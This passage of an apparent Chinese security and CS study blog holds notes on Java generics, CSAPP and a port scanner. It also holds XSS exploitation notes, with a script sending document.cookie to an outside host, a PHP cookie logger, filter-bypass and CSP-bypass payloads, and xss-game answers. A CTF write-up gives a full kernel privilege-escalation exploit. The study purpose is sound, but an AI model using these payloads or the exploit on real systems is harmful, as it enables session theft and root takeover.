&lt;T&gt; T test(T a) &#123; return a; &#125;&#125;//codeString a = MyTest2.&lt;String&gt;test("aaa"); 可以限定一个泛型类/方法可以实例化的类型. 1234567public class MyTest3 &#123; //code public static &lt;T extend Comparable&gt; T test(T a) &#123; return a; &#125; //限定类型T必须实现Comparable接口 //多个限定条件可以通过&amp;连接 //如果限定条件中包含类则类必须位于限定列表的第一个&#125; Java的泛型类与C++的模板类有本质区别. JVM中没有泛型类,泛型类在编译时会被转换为普通类.这一过程称为类型擦除.]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-IG-端口扫描器]]></title>
    <url>%2Fposts%2Ff3768575%2F</url>
    <content type="text"><![CDATA[一个简单的Demo 环境:python3.7. 原理:由于大多数互联网应用使用的都是TCP协议,可以使用python提供的BSD套接字的接口(socket)来对指定端口进行TCP全连接扫描. 命令行的解析使用optparse,然后使用threading来进行线程扫描增加效率.最后使用一个信号量来控制不同线程对IO的操作. 建立socket套接字 socket(int,int,int)能在kernel中创建一个socket并返回对应的描述符(即操作对象). 1int socket(int domain, int type, int protocol); domain. AF_UNIX/AF_LOCAL:用于本地程序的交互. AF_INET,AF_INET6:分别为基于IPv4和IPv6的网络交互. type. SOCK_STREAM:基于TCP. SOCK_DGRAM:基于UDP. Demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import optparsefrom socket import *from threading import *screenLock = Semaphore(value = 1)def connScan(host, port): try: connSocket = socket(AF_INET, SOCK_STREAM) #建立基于IPv4的TCP连接套接字 connSocket.connect((host, post)) #连接 connSocket.send('ViolentPython\r\n') results = connSocket.recv(100) screenLock.acquire() #信号量 print('[+]%d/tcp open' % port) print('[+] ' + str(results)) except: screenLock.acquire() #锁住 print('[-]%d/tcp closed' % port) finally: screenLock.release() #释放 connSocket.close()def portScan(host, ports): try: ip = gethostbyname(host) except: print('[-] Cannot resolve "%s": Unknown host' % host) return try: name = gethostbyaddr(ip) print('\n[+] Scan Results for: ' + name[0]) except: print('\n[+] Scan Results for: ' + ip) setdefaulttimeout(1) for port in ports: t = Thread(target=connScan, args=(host, int(port))) #新建任务线程 t.start()def main(): parser = optparse.OptionParser('usage%prog H &lt;target host&gt; -p &lt;target port&gt;') parser.add_option('-H', dest='host', type='string', help='host') parser.add_option('-p', dest='port', type='string', help='port') (options, args) = parser.parse_args() host = options.host ports = str(options.port).split(',') if (host == None) | (ports[0] == None): print(parser.usage) exit(0) portScan(host,ports)if __name__ == "__main__": main() 使用Nmap进行端口扫描 环境:python3.7,python-nmap. 原理:使用python-nmap在脚本中使用Nmap的全部功能,以此来进行其他端口扫描方法:TCP SYN SCAN,TCP NULL SCAN等. 1234567891011121314151617181920212223242526import nmapimport optparsefrom threading import *def nmapScan(host, port): nmScan = nmap.PortScanner() nmScan.scan(host, port) state = nmScan[host]['tcp'][int(port)]['state'] print('[*] ' + host + ' tcp/' + port + ' ' + state)def main(): parser = optparse.OptionParser('usage%prog H &lt;target host&gt; -p &lt;target port&gt;') parser.add_option('-H', dest='host', type='string', help='host') parser.add_option('-p', dest='port', type='string', help='port') (options, args) = parser.parse_args() host = options.host ports = str(options.port).split(',') if (host == None) | (ports[0] == None): print(parser.usage) exit(0) for port in ports: t = Thread(target=nmapScan, args=(host, port)) t.start()if __name__ == "__main__": main()]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>information-gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-NOTES-CSAPP-程序的机器级表示]]></title>
    <url>%2Fposts%2F9693d9%2F</url>
    <content type="text"><![CDATA[机器代码 计算机硬件只能识别和运行机器语言程序,通常都是先将高级语言源程序通过编译器转换为汇编语言目标程序,然后将汇编语言源程序通过汇编器转换为机器语言目标程序. 一句机器代码由若干字段组成,典型的是操作码字段加操作数字段,这些机器代码是不等长的比特序列,为了方便编程便有了对应的汇编代码. 汇编代码是机器代码的文本表示.而机器代码是与机器(具体来说是cpu)相关的,为了编程的效率就有了具有可移植性的高级语言. 也就说通常编程使用的源代码会先编译成汇编代码然后被汇编为机器代码,最后由cpu执行,这之中实际上是三次转换(编码). Intel处理器的演变 从第一代单芯片,16bit微处理器之一的8086,和其后继8087(建立了x86系列的浮点模型),8088(拓展了一个8bit外部总线). 到被淘汰的多寻址模式处理器80286.再到后面将体系结构拓展到32bit并增加平坦寻址模式的i386(这是Intel系列第一个全面支持Unix的机器),后继i486(集成了浮点单元). 和后面的Pentium系列和现在的Core系列.对应的微指令在不断变化,对应的机器代码也在不断更迭. 两个重要的抽象 计算机系统使用了很多抽象帮助不同层面的人更效率的工作,每一个抽象层都是对其上层隐藏下层的实现细节. 对于机器级编程来说有两种非常重要的抽象,ISA(指令集体系结构)和虚拟地址. 前者定义了机器级程序的格式和行为,定义了处理器状态,指令的格式和每条指令的作用.主要如下: 可执行的指令的集合和其对应的可接受的操作数类型. 操作数所能存放的寄存器组结构及其具体用途等. 操作数在存储空间的存放方式为大端或是小端. 指令执行过程的控制方式. 后者通过将DRAM,flash,磁盘存储器,特殊硬件和操作系统软件结合,所有使用的存储设备的存储单元被抽象成一个虚拟地址空间供程序使用,就像一个字节数组. 而这一部分又被操作系统抽象成了系统调用供高级语言程序使用,其实现细节也被隐藏. 生成机器代码 一个C源程序到可执行文件要经过预处理,编译获得汇编语言源程序,汇编获得机器语言目标代码文件,链接获得可执行文件. 12345678910111213141516&gt; gcc -Og -E test.c#-O&lt;n&gt;指示优化等级,-Og告诉编译器使用生成符合原始C代码结构的优化等级.#-E产生预处理后的文件.&gt; gcc -Og -S -masm=intel test.c#-S要求产生汇编代码,汇编代码也是文本,可读.#-masm=intel指定产生Intel格式汇编代码.&gt; gcc -Og -c test.c#-c产生目标代码文件,机器代码不是文本.&gt; file test.o#判断文件类型,输出:test.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped.&gt; gcc -Og -o test test.c#-o指定输出文件的文件名.#不加其他参数情况下产生可执行文件.&gt; objdump -d test.o#-d反汇编其text段,反汇编器得出的汇编代码为AT&amp;T格式,是GCC,OBJDUMP等工具的默认格式,另一常见的是Intel格式.#两者最大的区别为源操作数与目的操作数位置相反.例如Intel中mov目的在左,源在右.而ATT中正好相反. tips:b表示字节,w表示字,l表示双字,q表示四字. IA32体系结构 移步另一篇博客.]]></content>
      <categories>
        <category>CS</category>
        <category>NOTES</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-NOTES-CSAPP-位的解析]]></title>
    <url>%2Fposts%2F5e405a63%2F</url>
    <content type="text"><![CDATA[信息就是位+上下文 系统中所有的信息,包括磁盘文件,内存中的程序和用户存放的数据(进程)和网络上传输的数据都是由一串比特表示的.区别不同数据对象的就是读到这些数据对象时的上下文. 单独的位是没用的(只能区分两种情况),所以需要将这些位组合起来并加上对应的解析规则,就如微观世界的原子对于宏观世界的物体,基础门电路对于集成电路一样根据不同的排列组合产生不同的结果. 信息的存储 从最开始的带孔纸带,到后来的晶体管,一直到现在集成电路.虽然存储的都是01信息(比特位),但设备的大小,储存的方式,读写的速度都在不断进步. 通过将DRAM,flash,磁盘存储器,特殊硬件和操作系统软件结合,所有使用的存储设备的存储单元被抽象成一个虚拟地址空间供程序使用,就像一个字节数组. 而应用层的程序使用的就是这个被抽象出来的虚拟空间. 大多数计算机都以8位的字节(块)为最小可寻址内存单位(即一个存储单元),以位为最小操作单位.每一个存储单元有一个唯一的地址,也就对应的一个唯一的指针. 每台计算机都有一个字长,即指针的大小,这也限制了这台计算机的寻址空间.例如现在常见的32位和64位的计算机. (数据)对象 对于一个对象,有两个必需的属性:对象的地址和对象的类型. 对象的地址就是对应的指针.用于索引到对应的存储单元. 对象的类型决定了对象对应的解析规则(编码方式),换句话来说就是信息的编码与解码. 在几乎所有计算机上对象的地址位所使用字节(存储单元)中地址最小的一个的地址. 计算机的字节顺序分为大端法(IBM和Oracle的大多数机器)和小端法(大多数Intel兼容机).许多新型的微处理器使用双端法,即可自主设置. 大端法的最低有效字节在最前面,而小端法与之相反.(小端法更接近人类的思维,高位的值位权高). 按照对象的地址和计算机对应字节顺序获得原始数据后即可按照对象的类型对应的解析规则(编码方式)获得其真实含义. 编码方式 计算机里面三种最重要的数字表示 无符号编码:基于传统二进制,表示非负整数. 补码编码:基于补码,表示全体整数. 浮点数编码:用于表示实数的科学记数法的以2为基数的版本,将信息分段保存. 溢出 无论何种解析规则,一个n比特的数据结构可以映射2^n种情况.所以无法对整数,实数等达到满射.对于需要表达的数超出范围的情况,其结果是溢出,不同的编码方式对溢出的处理不同 整数的表示 现在大多数计算机的整型数据结构大多小于8个字节,也就是64个比特,也就是最多对应2^64个整数.这其中又包括有符号数和无符号数这两大类. 对于无符号数就是将解析结果(比特流)直接当作一个二进制数使用,而对于有符号数绝大多数机器将其当做补码使用.(tips:补码,原码和反码) 整数的运算 一个n比特的整数类型最多对应2^n个整数. 由于计算机执行得整数运算实际上是一种模运算的形式.所以运算时出现上溢或下溢后会像老式钟表一样产生11 -&gt; 12(实际为23点到明日0点或11点到12点)的过程,从过程来看就是发生了对最高位前一位的进位或借位. 浮点数的表示 十进制小数不一定有对应的二进制小数表示,通常使用IEEE浮点表示. 即使用(-1)^s * M * 2^E来表示一个数.其中s表示符号,M表示尾数,E表示阶码.分别使用三个位段编码这三个数.(实际应用中存储的是处理后的数) 同样,由于数据结构大小的限制,浮点数也有可表达的范围,且也是离散的(比如0.1再计算机中存的值实际不为0.1). 不同的是浮点数用一些规定指示对于不同溢出结果的处理方式. 例如C语言单精度浮点数中阶码中位全为0指示非规格化的数,阶码位全为1而尾数位全为0的指示无穷大,阶码位全为1而尾数位不全为0的指示NaN(特殊值). 浮点运算缺乏结合性和分配性. 浮点数的舍入 由于前面说的,计算机表示的浮点数是离散的,所以浮点运算只能近似的表示实数运算. 同样对于实数x需要通过舍入运算找到一个"最接近的"匹配值,才能用浮点形式表示出来. IEEE浮点格式定义了4种不同的舍入方式.(默认方法为找到最近匹配) 向偶数舍入,也称为向最接近的值舍入.在十进制中:其中1.4 -&gt; 1和1.6 -&gt; 2.而1.5(2.5) -&gt; 2.对于二进制则是最低有效位为0. 向下舍入 向上舍入 向零舍入 其他数据类型 只要建立相应的解析规则(编码,解码方式)就能获得新的数据类型.包括建立在之前基础数据类型之上的.例如各种字符集. datalab 填写bit.c,make btest生成,./btest检验.这一部分主要利用布尔代数的知识和基础编码知识. bitXor 直接展开. x ^ y = ~((~(x &amp; ~y)) &amp; (~(~x &amp; y))). tmin 直接返回0x80000000(依机器而异). isTmax Tmax满足Tmax == ~(Tmax + 1). allOddBits 先掩码再检验,!((x &amp; 0xAAAAAAAA) ^ 0xAAAAAAAA). negate 补码的负数运算为取反加一. isAsciiDigit 减法判断结果是否为负再将判定结果与即可. (!(((x - 0x30) &amp; 0x80000000) &gt;&gt; 31)) &amp; (!(((0x39 - x) &amp; 0x80000000) &gt;&gt; 31)). conditional 将x扩展,使用掩码即可. 1234int conditional(int x,int y,int z) &#123; x = (!!x) &lt;&lt; 31 &gt;&gt; 31; return (x &amp; y) | (~x &amp; z);&#125; isLessOrEqual 相减测负数,但要避免正数减负数溢出的情况,再增加对相等的检测即可. 1234567int isLessOrEqual(int x, int y) &#123; int s = ((x &amp; ~y) &gt;&gt; 31) &amp; 1; //检测是否x负y正 int m = ~((x ^ y) &gt;&gt; 31); //检测是否x和y是否同符号 return s | (((m &amp; (x - y) &gt;&gt; 31) | !(x ^ y)) &amp; 1);&#125; logicalNeg 通过0 == -0解出(虽然0x80000000 == -0x80000000但结果不同). ~(x | (~x + 1)) &gt;&gt; 31 &amp; 1. howManyBits 通过x ^= (x &lt;&lt; 1)异或相邻的数,找出为1的最高位在哪一位就可以了. 12345678910int howManyBits(int x) &#123; int n = 0; x ^= (x &lt;&lt; 1); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 16)))) &lt;&lt; 4); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 8)))) &lt;&lt; 3); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 4)))) &lt;&lt; 2); n += ((!!(x &amp; ((~0) &lt;&lt; (n + 2)))) &lt;&lt; 1); n += (!!(x &amp; ((~0) &lt;&lt; (n + 1)))); return n + 1;&#125; floatScale2 两种特殊情况,uf为非规格化小数或0时(即exp == 0);为NaN或INF时(即exp == 255); 正常情况若结果++exp为INF时,保证其不为NaN,即小数部分全为0. 123456789unsigned floatScale2(unsigned uf) &#123; int exp = (uf &amp; 0x7f800000) &gt;&gt; 23; int s = uf &amp; 0x80000000; if(exp == 0) return (uf &lt;&lt; 1) | s; if(exp == 255) return uf; ++exp; if(exp == 255) return 0x7f800000 | s; return (uf &amp; 0x807fffff) | (exp &lt;&lt; 23);&#125; floatFloat2Int 按照IEEE规则解析即可. 1234567891011121314int floatFloat2Int(unsigned uf) &#123; int s = uf &gt;&gt; 31; int exp = ((uf &amp; 0x7f800000) &gt;&gt; 23) - 127; int frac = (uf &amp; 0x007fffff) | 0x00800000; if(!(uf &amp; 0x7fffffff)) return 0; if(exp &gt; 31) return 0x80000000; if(exp &lt; 0) return 0; if(exp &gt; 23) frac &lt;&lt;= (exp - 23); else frac &gt;&gt;= (23 - exp); if(!((frac &gt;&gt; 31) ^ s)) return frac; else if(frac &gt;&gt; 31) return 0x80000000; else return ~frac + 1;&#125; floatPower2 考虑exp &lt; -127和exp &gt; 128,分别返回0和0x7f800000. 1234567unsigned floatPower2(int x) &#123; if(x &lt; -127) return 0; if(x &gt; 128) return 0x7f800000; x += 127; x = x &lt;&lt; 23; return x;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>NOTES</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-XSS-利用]]></title>
    <url>%2Fposts%2F7774f265%2F</url>
    <content type="text"><![CDATA[Cookie窃取和会话劫持 Cookie是浏览器和web系统一起设置的用于对用户进行身份识别和会话追踪的机制.其本质是网站存储在用户机器上的小文本文件. Cookie分存储在硬盘上的持久型Cookie,由浏览器存取,其生存时间由创建时参数决定.和存储在内存中的临时型Cookie,也称为会话Cookie,关闭浏览器则消失. Set-cookie:http响应头,向客户端发送cookie. Expires = date:Expires确定了cookie的有效终止日期,可选.缺省则cookie在浏览器内存中. Domain = domain-name:确定了哪些Internet域中的web服务器可读取浏览器储存的cookie,缺省为该web服务器域名. Path = path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie. Secure:在cookie中标记该变量,表明只有为https通信协议时,浏览器才向服务器提交cookie. Httponly:禁止javascript读取cookie. JS可以使用document.cookie访问到当前页面访问网站的Cookie(未开Httponly). 1&lt;script&gt;document.location = "http://www.test.com/cookie.php?cookie=" + document.cookie&lt;/script&gt; 然后在网站后端收集Cookie. 123456&lt;?php $cookie = $_GET['cookie']; $log = fopen("cookie.txt","a"); fwrite($log,$cookie."\n"); fclose($log)?&gt; Session与Cookie最大的区别为,Session保存在服务器端的内存当中,也是用来识别用户身份和维持会话的. 会话概念一般是基于Cookie的,会话劫持本质实在攻击中带上了被攻击者的Cookie并发送到服务端. 可以利用XMLHttpRequest发送POST请求(还可以js构造form表单并提交). 网络钓鱼 利用受害者心理弱点进行诈骗,一般使用钓鱼页面,HTML注入,Iframe钓鱼和Flash钓鱼. 点击劫持.实际上是一种视觉上的欺骗. 123456789101112131415iframe &#123; width: ; height: ; /* 控制大小 */ position: absulute; top: ; left: ; /* 控制位置 */ z-index: 2; /* 使iframe处于最上层 */ -moz-opacity: 0.5; opacity: 0.5; filter: alpha(opacity=0) /* 隐藏 */&#125; 图片覆盖攻击与之类似,控制图片的style,例如:style=position:absolute;right:320px;top:90px;. History Hack CSS中由4个伪类来定义链接的样式,分别是a:link,a:visited,a:active和a:hover,对应未访问的,已访问的,激活的和光标悬停的. 利用样式可以分别出用户是否访问过一个链接. 1234567891011121314151617181920212223var websites = ["http://www.baidu.com/"];//...for(var i = 0;i &lt; websites.length;i++) &#123; var link = document.createElement("a"); link.id = "id" + i; link.href = websites[i]; link.innerHTML = websites[i]; document.write('&lt;style&gt;'); document.write('#id' + i + ":visited &#123;color:#FF0000&#125;"); document.write('&lt;/style&gt;'); document.body.appendChild(link); var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color"); document.body.removeChild(link); if(color == "rgb(255,0,0)") &#123; var item = document.createElement('li'); item.appendChild(link); document.getElementByIf('visited').appendChild(item); &#125; else &#123; var item = document.createElement('li'); item.appendChild(link); document.getElementByIf('notvisited').appendChild(item); &#125;&#125; XSS Worm XSS Worm使用了大量Ajax技术和DOM节点操作,其攻击原理是利用某网站的XSS漏洞,针对该网站编写XSS Worm并创建一个传播源头,之后每一个访问源头的用户都会触发该XSS Worm,XSS Worm会判断该用户登陆状态,如果登录且未被感染就进行感染,一般在社交网站这种互动性强,人流量大的地方危害性大. 自动扫描工具 Arachni. mozilla-http-observatory. w3af. Acunetix Web Vulnerability Scanner. XSS漏洞利用工具 AttackAPI,Anehta. xss-game XSS game alert(1) to win prompt(1) to win XSS game Level 1:&lt;script&gt;alert("1")&lt;/script&gt;. Level 2:&lt;img src="/flag" onerror="alert(1)"&gt;. Level 3:'xxs.jpg' onerror='alert("xss")'/&gt;. Level 4:直接注入标签,3');alert('XSS. Level 5:signup页面跳转通过next变量,?next=javascript:alert('XSS');. Level 6:将参数改成外部的一个js文件,内容为alert('XSS'). alert(1) to win Warmup:闭合",1");alert(1);alert(". Adobe:闭合&lt;script&gt;标签,&lt;/script&gt;&lt;script&gt;alert(1)//. JSON:&lt;/script&gt;&lt;script&gt;alert(1)//.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-强网杯-2018-core]]></title>
    <url>%2Fposts%2F9dbf0ed8%2F</url>
    <content type="text"><![CDATA[分析 先解包. 123mv core.cpio ./core.cpio.gzgunzip core.cpio.gzcpio -idmv &lt; core.cpio 修改init删除定时关机,然后重新打包. 1./gen_cpio.sh core.cpio 遇到内存不足不断重启,修改start.sh里64M为128M. 分析core.ko,ioctl系统调用会根据传入的文件描述符去调用文件自己定义的ioctl系统,这里为core_ioctl. 123456789101112131415161718192021__int64 __fastcall core_ioctl(__int64 a1, __int64 a2, __int64 a3)&#123; __int64 v3; // rbx v3 = a3; switch ( (_DWORD)a2 ) &#123; case 0x6677889B: core_read(a3, a2); break; case 0x6677889C: printk(&amp;unk_2CD, a3); off = v3; break; case 0x6677889A: printk(&amp;unk_2B3, a2); core_copy_func(v3); break; &#125; return 0LL;&#125; 漏洞点在core_copy_func,存在整数溢出. 漏洞利用思路为设置off后利用core_read来leak canary,然后write将payload写入name全局变量,最后core_copy栈溢出劫持控制流. 劫持的控制流是进入内核态的,可以commit_creds(prepare_kernel_cred(0));提权然后返回用户态getshell. init时kallsyms的内容保存到了/tmp/kallsyms,找到commit_creds和prepare_kernel_cred的地址. 1234/ $ cat /tmp/kallsyms | grep commit_credsffffffff9cc9c8e0 T commit_creds/ $ cat /tmp/kallsyms | grep prepare_kernel_credffffffff9cc9cce0 T prepare_kernel_cred core.ko开了canary和nx,内核开了kaslr没有开smep. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#define COMMAND_READ 0x6677889B#define COMMAND_PRINT 0x6677889C#define COMMAND_COPY 0x6677889Aunsigned long user_cs, user_ss, user_rflags;static void save_state()&#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "pushfq\n" "popq %2\n" : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory" );&#125;//at&amp;t assembly//内核返回用户态时会调用iretq,iretq会依次弹出rip,cs,eflags,rsp,ss之后做一些判断,进入内核态前存储这些参数用来构造payload.unsigned long long commit_creds_addr = 0;unsigned long long prepare_kernel_cred_addr = 0;void set_uid()&#123; char * (* pkc)(int) = prepare_kernel_cred_addr; void (* cc)(char *) = commit_creds_addr; (* cc)((* pkc)(0));&#125;//commit_creds(prepare_kernel_cred(0));提权void getshell()&#123; system("/bin/sh");&#125;int main(int argc,char ** argv)&#123; printf("prepare_kernel_cred: "); scanf("%llx", &amp;prepare_kernel_cred_addr); printf("commit_creds: "); scanf("%llx", &amp;commit_creds_addr); char s[100]; char * leak = (char *)malloc(1024); int fd = open("/proc/core", O_RDWR); ioctl(fd, COMMAND_PRINT, 0x40); ioctl(fd, COMMAND_READ, leak); unsigned long long canary = ((unsigned long long *)leak)[0]; unsigned long long ret_addr = ((unsigned long long *)leak)[2]; unsigned long long iret_addr = prepare_kernel_cred_addr - 0x4c21e; save_state(); unsigned long long rop_chain[]=&#123; 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, 0x9090909090909090, canary, 0x9090909090909090, &amp;set_uid, //提权 ret_addr - 0xc5, //swapgs_ret &amp;s - 0x100, //rbp iret_addr, //返回用户态 &amp;getshell, //rip user_cs, //cs user_rflags, //rflags &amp;s - 0x100, //rsp user_ss //ss &#125;; write(fd, rop_chain, 1024); ioctl(fd, COMMAND_COPY, 0xff00000000000100); return 0;&#125; 编译exp,拷贝到/tmp目录 1gcc -Os -static exp.c -lutil -o exp 重新打包cpio 1find . | cpio -o -H newc | gzip &gt; ../core.cpio 启动内核运行exp,因为开了kaslr,手动输入prepare_kernel_cred,commit_creds地址.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-XSS-基础]]></title>
    <url>%2Fposts%2F709c2bca%2F</url>
    <content type="text"><![CDATA[概览 XSS即跨站脚本攻击Cross-site scripting,缩写和CSS重名,所以改为XSS. 指攻击者利用网站漏洞将恶意的脚本代码(包括HTML代码和JavaScript等富客户端脚本语言)注入到网页之中,诱使其他用户访问这个页面从而执行其中的恶意代码.(浏览器中有javascript解释器) 分类 反射型XSS:也叫做非持久型XSS,参数型XSS.即将恶意代码附在URL中,只作用在前端,一般是搜索框,用户登录,窃取用户cookie或进行钓鱼欺骗,POST的内容也可以触发反射型XSS. 持久型XSS:也叫做存储型XSS.即恶意代码会被存储到服务器端的数据库,一般是留言板,评论,博客日志的数据. DOM型XSS:DOM型XSS不按照数据是否存储在服务端来划分,从效果上DOM-Based XSS也是一种反射型XSS.通过修改页面的DOM节点形成的XSS,称之为DOM-Based XSS,DOM型XSS取出和执行恶意代码由浏览器端完成,不与服务端交互. 从前后端交互的角度来看:DOM型和反射型经过后端不经过数据库;存储型经过后端经过数据库. 具体payload可以自行搜索xss cheat sheet.比如:https://gbhackers.com/top-500-important-xss-cheat-sheet/. 浏览器解析 浏览器接收到一个HTML文档时,首先是HTML解析器对HTML文档进行词法解析,这一过程完成HTML解码并创建DOM树,接下来JavaScript解析器会介入对内联脚本进行解析,同时如果遇到需要URL的上下文环境,URL解析器就会介入并完成URL的解码工作,URL解析器的解码顺序会根据URL所在位置不同,可能在JavaScript解析器之前或之后解析. HTML字符实体:呈现HTML页面时,如果直接使用特殊字符如&lt;或&gt;,浏览器会误以为它们是标签的开始或结束,若想正确的在HTML页面呈现特殊字符就需要用到其对应的字符实体. 字符实体是一个预先定义好的转义序列,以&amp;开头,以分号结束.如&lt;的实体名称为&amp;lt;,实体编号为&amp;#60;,字符都有实体编号,但有些字符没有实体名称. JavaScript编码最常用的有Unicode转义序列,URL编码即%加字符的ASCII编码对应的2位16进制数字. &lt;a href="javascript:alert(1)"&gt;test&lt;/a&gt;解析顺序:HTML解码,URL解码,JS解码. 绕过XSS-Filter 最简单的注入方式有: 在HTML中内嵌的文本中,恶意内容以&lt;script&gt;标签形成注入; 在内联的JavaScript中,拼接的数据突破了原本的限制(字符串,变量,方法名等); 在标签属性中,恶意内容包含引号,从而突破属性值的限制,注入其他属性或者标签; 以上攻击方式通常都伴随着标签闭合,闭合优先级高于双引号完整性优先级的特殊标签:&lt;!--,&lt;iframe&gt;,&lt;noframes&gt;,&lt;noscript&gt;,&lt;script&gt;,&lt;style&gt;,&lt;textarea&gt;,&lt;title&gt;,&lt;xmp&gt;. 当后端对输入进行检测时就需要绕过XSS-Filter. Javascript伪协议 利用HTML标签属性值执行XSS,需要浏览器(例如IE6)支持Javascript伪协议. 不是所有标记的属性值都能产生XSS,通常只有引用文件的属性才能触发XSS. 1234&lt;table background="javascript:alert(/xss/)"&gt;&lt;/table&gt;&lt;table background="jAvascript:alert(/xss/)"&gt;&lt;/table&gt;&lt;table background="%20jAvascript:alert(/xss/)"&gt;&lt;/table&gt;&lt;!-- 还有href,background,action,src,lowsrc,bgsound.value,dynsrc等属性 --&gt; 字符编码绕过 html标签支持html实体编码;支持十六进制,以&amp;#x{0}*开头(x大小写皆可);支持十进制,以&amp;#{0}*开头;后缀有没有;皆可. 可以将&amp;#01,&amp;#02等字符插入JS和Vbs代码头部,将&amp;#9(TAB),&amp;#10(\n),&amp;#13插入任何地方(\r).(ASCII码绕过) 样式表也支持分析和解释\连接的十六进制字符串形式. javascript的eval函数,支持十六进制,以\x开头,x只能小写且必须两位;支持八进制,以\开头,必须两位;支持\u前缀的unicode,必须四位.也可以结合String.fromCharCode()函数使用. javascript本身支持unicode,escapes,十六进制,八进制等编码形式. Microsoft提供脚本加密机制,包括JScript和VBScript. 12345&lt;iframe onload = VBScript&amp;#46;Encode:(*)&gt;&lt;!-- or --&gt;&lt;script language="JScript.Encode"&gt;(*)&lt;/script&gt; 利用事件 W3C将事件分为用户接口(鼠标,键盘),逻辑(处理的结果),变化(对文档进行修改). 1&lt;img src="#" onerror=alert(/xss/)&gt; 利用CSS跨站 利用CSS跨站剖析攻击,但各浏览器不能通用,不过CSS样式表可以使用@import和link的方式远程引用(@import还可以直接执行代码). 1234567&lt;div style = "background-image:url(javascript:alert('XSS'))"&gt;&lt;!-- or --&gt;&lt;style&gt; body &#123;background-image: url("javascript:alert('XSS')");&#125;&lt;/style&gt;&lt;!-- IE5及以后版本支持在CSS中使用expression --&gt;&lt;div style = "width: expression(alert('XSS'));"&gt; 拆分拼接法 当网站限制输入长度时可以使用一个字符串变量将代码拆分,然后使用eval执行.(或者相同思路) UTF-7 BOM XSS UTF-7指7位元Unicode转换格式,使用+,-符号控制编码的开始和结束. BOM指字节顺序标记,是插入到以UTF-8,UTF-16,UTF-16,UTF-32编码的Unicode文件开头的特殊标记,用来识别Unicode文件的编码类型. 如果返回的字符集限制不严格,就可以通过注入+/v8,+/v9,+/v+,+/v/这几个关键字(utf-7 bom)让浏览器以UTF-7解析文件从而绕过检测进行XSS(其实插入&lt;meta charset="utf-7"&gt;也行,不过&lt;和&gt;容易被过滤). HTTP Response Splitting 又称为CRLF注入,其中CR -&gt; '\r',LF -&gt; '\n',原理是在HTTP Headers中\r\n就是分隔符,类似C语言中的;. 如果用户输入与HTTP Response有关且未过滤\r\n攻击者可以在HTTP Response中注入HTTP Header,例如Set-Cookie. Data URIs XSS 利用data:text/html;base64注入XSS代码即可,不过图片标签需要单击才能触发,可以使用&lt;object&gt;标签(iframe,anchor等也支持Data URIs). Cookie XSS 当用户输入可以影响到cookie且cookie内容会被输出到页面中时,就可以将恶意代码注入到cookie中.当然不止cookie,其他本地存储对象也可以(Cookie有容量限制). 其他 还有比如大小写混淆,使用单引号或不使用引号. 使用expression时可以构造不同的全角字符绕过. 运用/**/,&lt;!-- --&gt;,&lt;comment&gt;&lt;/comment&gt;(只支持IE系列浏览器)注释字符绕过黑名单.样式表中的\和\0会被浏览器忽略. 对关键字进行转码处理:e -&gt; \65(\065) IE6中标记和属性用/分开. 1&lt;img/src = "javascript:alert('xss');"&gt; IE嗅探机制会导致其自动解析一些脚本(无视文件后缀). Unleashing an Ultimate XSS Polyglot 源于Unleashing an Ultimate XSS Polyglot的payload. 1jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e 能够检测到存在于HTML属性,HTML文字内容,HTML注释,跳转链接,内联JavaScript字符串,内联CSS样式表等多种上下文中的XSS漏洞,也能检测eval(),setTimeout(),setInterval(),Function(),innerHTML,document.write()等DOM型XSS漏洞,并且能绕过一些XSS过滤器. CSP Bypass 对于header("Content-Security-Policy: default-src 'self'; script-src 'self' ");这种规则,只允许加载当前域的js,可以配合文件上传漏洞上传js内容. CSP除了阻止不可信js的解析以外,还可以阻止向不可信域的请求,比如尝试加载外域的图片也会被阻止,可以通过预加载绕过(这个主要是因为浏览器对CSP的支持不完整). 1234&lt;link rel="prefetch" href="http://aaa.cn"&gt;&lt;!-- (H5预加载)(only chrome) --&gt;&lt;link rel="dns-prefetch" href="http://aaa.cn"&gt;&lt;!-- (DNS预加载) --&gt; 对于header("Content-Security-Policy: default-src 'self'; script-src http://127.0.0.1/static/ ");这种规则,如果可信域没有上传,可以找可控的重定向文件,绕过目录限制. 当开发者使用jsonp来跨域获取数据,就可以通过callback构造任意js.通过类似href的跨域请求也可以绕过.在通过跨协议调用js时,发送的http请求里Referer为空. HTML5 HTML5新增了特性也同时新增了攻击面,HTML5sec是一群安全研究者建立的项目.]]></content>
      <categories>
        <category>IS</category>
